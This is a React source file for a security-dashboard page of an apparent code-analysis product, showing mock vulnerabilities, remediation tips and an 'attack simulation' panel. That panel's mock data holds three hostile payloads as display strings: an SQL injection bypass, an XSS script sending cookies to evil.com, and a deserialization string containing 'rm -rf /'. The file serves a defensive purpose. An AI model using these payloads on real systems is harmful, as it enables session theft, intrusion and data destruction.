import { createFileRoute } from "@tanstack/react-router";
import { motion } from "framer-motion";
import {
  ShieldAlert,
  AlertTriangle,
  Zap,
  Lock,
  Key,
  Database,
  Code,
  Terminal,
  FileWarning,
  Clock,
  TrendingUp,
} from "lucide-react";
import { PageHeader } from "@/components/PageHeader";
import { vulnerabilities } from "@/lib/mock-data";

export const Route = createFileRoute("/dashboard/security")({
  head: () => ({ meta: [{ title: "Security — CodeGuardian AI" }] }),
  component: Security,
});

const sevColor = {
  Critical: "#EF4444",
  High: "#F97316",
  Medium: "#F59E0B",
  Low: "#10B981",
} as const;

const sevBg = {
  Critical: "bg-red-500/10",
  High: "bg-orange-500/10",
  Medium: "bg-yellow-500/10",
  Low: "bg-green-500/10",
} as const;

// Mock attack simulation data
const attackSimulations = [
  {
    id: "a1",
    type: "SQL Injection",
    payload: "' OR '1'='1' --",
    target: "src/db/Queries.php:184",
    result: "Bypasses authentication, returns all user records",
  },
  {
    id: "a2",
    type: "XSS Attack",
    payload: '<script>fetch("evil.com?c="+document.cookie)</script>',
    target: "public/js/cart.js:112",
    result: "Steals session cookies, enables account takeover",
  },
  {
    id: "a3",
    type: "Deserialization",
    payload: 'O:8:"EvilCode":1:{s:4:"exec";s:10:"rm -rf /";}',
    target: "src/api/Webhook.php:23",
    result: "Remote code execution, full system compromise",
  },
];

// Mock AI recommendations
const aiRecommendations = [
  {
    id: "r1",
    title: "Migrate to PDO with Prepared Statements",
    impact: "Eliminates 14 SQL injection vectors",
    effort: "2-3 days",
    priority: "Critical",
  },
  {
    id: "r2",
    title: "Implement bcrypt Password Hashing",
    impact: "Protects 50K+ user credentials",
    effort: "1 day + migration script",
    priority: "Critical",
  },
  {
    id: "r3",
    title: "Add CSRF Token Validation",
    impact: "Secures all state-changing endpoints",
    effort: "4-6 hours",
    priority: "High",
  },
  {
    id: "r4",
    title: "Upgrade jQuery to 3.7+",
    impact: "Patches 8 known CVEs",
    effort: "2-3 hours",
    priority: "Medium",
  },
];

function Security() {
  const criticalCount = vulnerabilities.filter((v) => v.severity === "Critical").length;
  const highCount = vulnerabilities.filter((v) => v.severity === "High").length;
  const mediumCount = vulnerabilities.filter((v) => v.severity === "Medium").length;

  return (
    <>
      <PageHeader
        eyebrow="threat intelligence"
        title="Security Analysis"
        description="AI-powered vulnerability detection, attack simulation, and remediation guidance."
        actions={
          <button className="inline-flex items-center gap-2 rounded-full bg-red-500 px-4 py-2 text-sm font-semibold text-white retro-border retro-shadow hover:bg-red-600 transition-colors">
            <ShieldAlert className="h-4 w-4" /> Export Report
          </button>
        }
      />

      {/* Threat Overview Cards */}
      <div className="grid gap-4 md:grid-cols-4 mb-6">
        <ThreatCard
          icon={ShieldAlert}
          label="Critical"
          count={criticalCount}
          color="#EF4444"
          trend="+2 this week"
        />
        <ThreatCard
          icon={AlertTriangle}
          label="High Risk"
          count={highCount}
          color="#F97316"
          trend="Stable"
        />
        <ThreatCard
          icon={FileWarning}
          label="Medium"
          count={mediumCount}
          color="#F59E0B"
          trend="-1 resolved"
        />
        <ThreatCard
          icon={Lock}
          label="Attack Vectors"
          count={attackSimulations.length}
          color="#8B5CF6"
          trend="Simulated"
        />
      </div>

      {/* Main Content Grid */}
      <div className="grid gap-6 lg:grid-cols-3">
        {/* Left Column: Vulnerability Feed */}
        <div className="lg:col-span-2 space-y-4">
          <h2 className="font-display text-2xl font-semibold text-brand-navy flex items-center gap-2">
            <Database className="h-6 w-6 text-red-500" />
            Vulnerability Feed
          </h2>

          {vulnerabilities.map((vuln, i) => (
            <motion.article
              key={vuln.id}
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: i * 0.05 }}
              className="rounded-2xl bg-white retro-border retro-shadow overflow-hidden"
            >
              {/* Header Bar */}
              <div
                className="px-4 py-2 flex items-center justify-between"
                style={{ backgroundColor: sevColor[vuln.severity] + "15" }}
              >
                <div className="flex items-center gap-2">
                  <span
                    className="rounded-full px-2.5 py-0.5 text-[10px] font-bold uppercase tracking-wider text-white"
                    style={{ backgroundColor: sevColor[vuln.severity] }}
                  >
                    {vuln.severity}
                  </span>
                  <code className="font-mono text-xs text-gray-600">{vuln.cwe}</code>
                </div>
                <div className="flex items-center gap-1 text-xs text-gray-500">
                  <Clock className="h-3 w-3" />
                  <span>2h ago</span>
                </div>
              </div>

              {/* Content */}
              <div className="p-4">
                <h3 className="font-display text-lg font-semibold text-brand-navy flex items-center gap-2">
                  <Zap className="h-4 w-4 text-red-500" />
                  {vuln.title}
                </h3>

                <div className="mt-2 flex items-center gap-2 text-xs">
                  <Code className="h-3.5 w-3.5 text-gray-400" />
                  <code className="font-mono text-gray-600">{vuln.file}</code>
                  <span className="text-gray-400">:</span>
                  <span className="font-mono text-gray-600">{vuln.line}</span>
                </div>

                <p className="mt-3 text-sm text-gray-700 leading-relaxed">{vuln.description}</p>

                {/* Terminal-style Remediation */}
                <div className="mt-4 rounded-xl bg-brand-navy p-3 retro-border">
                  <div className="flex items-center gap-2 mb-2">
                    <Terminal className="h-3.5 w-3.5 text-green-400" />
                    <span className="text-[10px] font-semibold uppercase tracking-wider text-green-400">
                      AI Remediation
                    </span>
                  </div>
                  <p className="font-mono text-xs text-brand-cream leading-relaxed">
                    {vuln.remediation}
                  </p>
                </div>
              </div>
            </motion.article>
          ))}
        </div>

        {/* Right Column: Attack Simulation & Recommendations */}
        <div className="space-y-6">
          {/* Attack Simulation Panel */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="rounded-2xl bg-linear-to-br from-red-500 to-orange-500 p-5 retro-border retro-shadow text-white"
          >
            <div className="flex items-center gap-2 mb-4">
              <div className="rounded-lg bg-white/20 p-2">
                <ShieldAlert className="h-5 w-5" />
              </div>
              <h3 className="font-display text-lg font-semibold">Attack Simulation</h3>
            </div>

            <div className="space-y-3">
              {attackSimulations.map((attack, i) => (
                <motion.div
                  key={attack.id}
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ delay: 0.3 + i * 0.1 }}
                  className="rounded-xl bg-white/10 backdrop-blur-sm p-3 border border-white/20"
                >
                  <div className="flex items-center gap-2 mb-2">
                    <AlertTriangle className="h-3.5 w-3.5" />
                    <span className="text-xs font-semibold">{attack.type}</span>
                  </div>
                  <code className="block font-mono text-[10px] bg-black/30 rounded px-2 py-1 mb-2 overflow-x-auto">
                    {attack.payload}
                  </code>
                  <div className="text-[10px] opacity-90">
                    <div className="mb-1">
                      <span className="opacity-70">Target:</span> {attack.target}
                    </div>
                    <div>
                      <span className="opacity-70">Impact:</span> {attack.result}
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>

          {/* AI Recommendations */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="rounded-2xl bg-white p-5 retro-border retro-shadow"
          >
            <div className="flex items-center gap-2 mb-4">
              <div className="rounded-lg bg-purple-100 p-2">
                <Key className="h-5 w-5 text-purple-600" />
              </div>
              <h3 className="font-display text-lg font-semibold text-brand-navy">
                AI Recommendations
              </h3>
            </div>

            <div className="space-y-3">
              {aiRecommendations.map((rec, i) => (
                <motion.div
                  key={rec.id}
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: 0.5 + i * 0.1 }}
                  className="rounded-xl bg-gray-50 p-3 border-2 border-gray-200"
                >
                  <div className="flex items-start justify-between gap-2 mb-2">
                    <h4 className="text-sm font-semibold text-brand-navy">{rec.title}</h4>
                    <span
                      className="rounded-full px-2 py-0.5 text-[9px] font-bold uppercase tracking-wider text-white shrink-0"
                      style={{
                        backgroundColor:
                          sevColor[rec.priority as keyof typeof sevColor] || sevColor.Medium,
                      }}
                    >
                      {rec.priority}
                    </span>
                  </div>
                  <div className="space-y-1 text-xs text-gray-600">
                    <div className="flex items-center gap-1.5">
                      <TrendingUp className="h-3 w-3 text-green-600" />
                      <span>{rec.impact}</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Clock className="h-3 w-3 text-blue-600" />
                      <span>{rec.effort}</span>
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>

            <button className="mt-4 w-full rounded-lg bg-brand-navy px-4 py-2 text-sm font-semibold text-white retro-border hover:bg-brand-navy/90 transition-colors">
              Generate Remediation Plan
            </button>
          </motion.div>
        </div>
      </div>
    </>
  );
}

function ThreatCard({
  icon: Icon,
  label,
  count,
  color,
  trend,
}: {
  icon: any;
  label: string;
  count: number;
  color: string;
  trend: string;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="rounded-2xl bg-white p-4 retro-border retro-shadow"
    >
      <div className="flex items-center justify-between mb-3">
        <div className="rounded-lg p-2" style={{ backgroundColor: color + "15" }}>
          <Icon className="h-5 w-5" style={{ color }} />
        </div>
        <span className="text-xs text-gray-500">{trend}</span>
      </div>
      <div className="font-display text-3xl font-bold text-brand-navy">{count}</div>
      <div className="text-sm text-gray-600 mt-1">{label}</div>
    </motion.div>
  );
}

// Made with Bob
